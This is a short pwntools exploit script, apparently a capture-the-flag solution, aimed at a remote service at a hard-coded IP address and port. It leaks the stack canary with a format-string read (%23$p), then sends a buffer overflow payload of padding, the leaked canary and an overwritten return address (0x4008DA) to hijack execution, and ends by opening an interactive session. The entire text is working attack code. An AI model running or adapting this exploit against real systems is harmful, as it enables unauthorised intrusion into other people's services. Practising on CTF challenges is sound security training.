from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('111.198.29.45', 30705)

t.sendlineafter('e \n', '2')
t.sendline('%23$p')
canary = int(t.recv(18),16)
log.info(hex(canary))
t.sendlineafter('e \n', '1')
addr_text = 0x4008DA
payload = cyclic(136) + p64(canary) + p64(0)+ p64(addr_text)
t.sendline(payload)

t.interactive()
